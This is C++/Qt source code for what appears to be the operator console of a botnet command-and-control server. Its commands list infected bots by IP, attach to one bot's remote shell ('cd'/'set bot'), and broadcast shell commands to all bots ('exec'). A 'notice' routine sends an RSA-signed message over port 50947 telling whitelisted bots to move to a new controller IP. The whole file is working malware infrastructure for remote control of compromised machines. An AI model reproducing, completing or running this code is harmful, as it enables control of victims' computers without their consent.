#include "console.h"
#include <cryptopp/pssr.h>

Console::Console(Server *server, QObject *parent): QThread(parent), server(server) {
    bot = NULL;
}

void Console::run() {
    in = new QTextStream(stdin);
    moveToThread(thread());
    invite();
    QTimer *timer = new QTimer;
    timer->setInterval(100);
    timer->start();
    QObject::connect(timer, SIGNAL(timeout()), this, SLOT(processData()), Qt::DirectConnection);
    QObject::connect(server, SIGNAL(log(QString)), this, SLOT(log(QString)));
    exec();
}

void Console::processData() {
    QString original = in->readLine();
    QString s = original.toUpper();

    printing.lock();
    if (s == "EXIT")
        if (bot)
            bot = NULL;
        else
            qApp->exit(0);
    else if (bot) {
        emit tellBot(original.toUtf8());
        printing.unlock();
        return;
    } else if (s == "DUMP") {
        server->dumpWhitelist();
    } else if (s == "BOTLIST" || s == "LS") {
        printf("bots: \n");
        QVector<Bot*> bots = server->getBots();
        for (int i = 0; i < bots.size(); i++)
            printf("%d: %s white: %d\n", i, bots[i]->peerAddress().toString().toUtf8().constData(), bots[i]->hasWhiteIp);
    } else if (s == "HELP") {
        printf("help\nbotlist\nls\nset bot\ndump\nexit\nnotice ip.ip.ip.ip");
    } else if (s.left(7) == "SET BOT" || s.left(2) == "CD") {
        if (s.left(2) == "CD")
            bot = server->getBot(QHostAddress(s.right(s.length() - 3)));
        else
            bot = server->getBot(QHostAddress(s.right(s.length() - 8)));

        if (bot == NULL)
            printf("Bot not found\n");
        else {
            QObject::connect(bot,
                             SIGNAL(dataAvailable(Bot*, QByteArray)),
                             this,
                             SLOT(dataFromBot(Bot*, QByteArray)),
                             Qt::DirectConnection);
            QObject::connect(this,
                             SIGNAL(tellBot(QByteArray)),
                             bot,
                             SLOT(safeWrite(QByteArray)));
            emit tellBot("cd .");
        }
    } else if (s.left(4) == "EXEC" && !bot) {
        server->sendMessage(original.right(original.length() - 5).toUtf8());
    } else if (s.left(6) == "NOTICE") {
        QString ip = s.right(s.length() - 7);
        printf("Switch all bots to ip %s? (y/n) > ", ip.toLocal8Bit().constData());
        char c;
        scanf("%c", &c);
        if (c == 'y')
            notice(ip);
        else
            printf("operation cancelled\n");
    }

    invite();
    printing.unlock();
}

void Console::notice(QString ip) {
    printf("trying to switch...\n");
    QVector<Bot*> bots = server->getBots();
    QByteArray message;
    QDataStream stream(&message, QIODevice::WriteOnly);
    stream << 1;
    stream << QHostAddress(ip).toIPv4Address();

    AutoSeededRandomPool rng;
    RSASS<PSS, SHA1>::Signer signer(server->getPrivateKey());
    int len = signer.MaxSignatureLength();
    SecByteBlock signature(len);
    signer.SignMessage(rng, (const byte*)message.constData(), message.size(), signature);

    QByteArray sign;
    for (int i = 0; i < signature.size(); i++)
        sign.push_back((char)signature[i]);


    QByteArray final = "set\n" + message.toBase64() + '\n' + sign.toBase64() + '\n';
    for (int i = 0; i < bots.size(); i++)
        if (bots[i]->hasWhiteIp) {
            printf("trying: %s\n", bots[i]->peerAddress().toString().toLocal8Bit().constData());
            QTcpSocket socket;
            socket.connectToHost(bots[i]->peerAddress(), 50947);

            if (!socket.waitForConnected(2000)) {
                printf("next one\n");
                continue;
            }

            socket.write(final);
            socket.flush();
            mySleep(2000);
            socket.close();
            printf("message sended.\n");
        }
}

void Console::log(QString message) {
    printing.lock();
    printf(" %s\n", message.toUtf8().constData());
    invite();
    printing.unlock();
}

void Console::invite() {
    printf("\n");
    if (bot)
        printf("%s:%s", bot->peerAddress().toString().toUtf8().constData(), bot->getCWD().constData());
    printf("> ");
    fflush(stdout);
}

void Console::dataFromBot(Bot *b, QByteArray data) {
    if (b == bot) {
        printing.lock();
        if (data.size())
            printf("%s", data.constData());
        else
            invite();

        printing.unlock();
    } else
        qDebug() << "Unauthorized from " + b->peerAddress().toString();
}

void Console::mySleep(int msec) {
    QEventLoop loop;
    QTimer::singleShot(msec, &loop, SLOT(quit()));
    loop.exec();
}
